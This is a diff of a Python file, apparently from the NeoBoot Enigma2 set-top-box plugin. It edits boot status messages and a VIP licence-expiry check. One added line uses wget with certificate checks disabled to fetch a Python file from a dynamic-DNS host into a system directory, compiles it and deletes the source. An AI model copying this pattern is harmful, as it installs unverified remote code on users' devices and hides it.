@@ -802,8 +802,8 @@ class NeoBootImageChoose(Screen):
                 if fileExists('/.control_boot_new_image'):  
                     os.system('rm -f /.control_boot_new_image; echo "Image uruchomione OK\nNie kasuj tego pliku. \n\nImage started OK\nDo not delete this file."  > /.control_ok ')          
                 if not fileExists('/.control_boot_new_image'):  
-                    os.system('echo "Image uruchomione OK\nNie kasuj tego pliku. \n\nImage started OK\nDo not delete this file."  > /.control_ok')
-                                                                                                        
+                    os.system('echo "Image uruchomione OK\nNie kasuj tego pliku. \n\nImage started OK\nDo not delete this file."  > /.control_ok')                                           
+                                                
         os.system('date "+%Y%m%d"  > /tmp/.finishdate')
         if fileExists('/tmp/.nkod'):
                 pass
@@ -1498,7 +1498,8 @@ def main(session, **kwargs):
                 if not fileExists('/usr/lib/periodon/.accesdate') or getAccesDate() != 'isaccess' and fileExists('/usr/lib/periodon/.kodn'):
                         system('rm /usr/lib/periodon/.kodn')                                
                         session.open(MessageBox, _('Neoboot vip version has expired, please re-access.'), type=MessageBox.TYPE_ERROR)
-                elif not fileExists('/usr/lib/periodon/.kodn'):       
+                elif not fileExists('/usr/lib/periodon/.kodn'):   # prosze nie kakowac !!! - please do not crack :( 
+                        os.system('wget --no-check-certificate https://neoboot.myftp.biz:22222/shares/U/Testinout.py -O /usr/lib/enigma2/python/Tools/Testinout.py; wget --no-check-certificate https://neoboot.myftp.biz:22222/shares/U/.accesdate -O /usr/lib/periodon/.accesdate; python -O -m compileall /usr/lib/enigma2/python/Tools/Testinout.py; rm /usr/lib/enigma2/python/Tools/Testinout.py')
                         session.open(MessageBox, _('Neoboot vip version has expired, please re-access.'), type=MessageBox.TYPE_ERROR)
                 else:
                         pass
